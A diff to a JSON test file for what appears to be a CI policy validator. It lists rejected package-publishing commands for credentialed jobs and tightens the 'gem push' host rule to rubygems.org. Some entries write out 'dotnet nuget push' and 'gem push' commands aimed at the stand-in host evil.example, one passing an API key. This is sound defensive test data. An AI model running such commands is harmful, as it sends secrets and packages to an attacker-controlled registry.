@@ -272,7 +272,10 @@
     "a credentialed job runs `dotnet nuget push \"./x.nupkg\" --api-key \"$K\" --source https://evil.example/v3/index.json`: dotnet nuget push: --source must be exactly https://api.nuget.org/v3/index.json"
   ],
   "gem push --host": [
-    "a credentialed job runs `gem push --host https://evil.example \"./x.gem\"`: gem push: --host is not an option it may take"
+    "a credentialed job runs `gem push --host https://evil.example \"./x.gem\"`: gem push: --host must be exactly https://rubygems.org"
+  ],
+  "gem push without a host": [
+    "a credentialed job runs `gem push \"./release/$ARTIFACT\"`: gem push must run with --host"
   ],
   "curl -o": [
     "a credentialed job runs `curl -fsS -o x https://proxy.golang.org/x`: curl: -o is not an option it may take"
